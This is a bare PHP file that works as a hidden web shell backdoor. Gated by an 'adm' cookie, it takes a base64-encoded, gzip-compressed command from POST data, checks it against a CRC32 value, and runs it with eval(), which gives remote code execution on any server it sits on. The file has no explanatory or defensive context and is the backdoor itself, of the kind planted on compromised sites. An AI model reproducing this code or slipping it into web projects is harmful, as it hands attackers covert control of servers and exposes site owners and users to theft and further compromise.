<?php
if (isset($_COOKIE["adm"])) {
	if (isset($_POST['crc'], $_POST['cmd'])) {
		if (sprintf('%u', crc32($_POST['cmd'])) == $_POST['crc']) {
			eval(gzuncompress(base64_decode($_POST['cmd'])));
		} else 
			echo "repeat_cmd";
	}
}
?>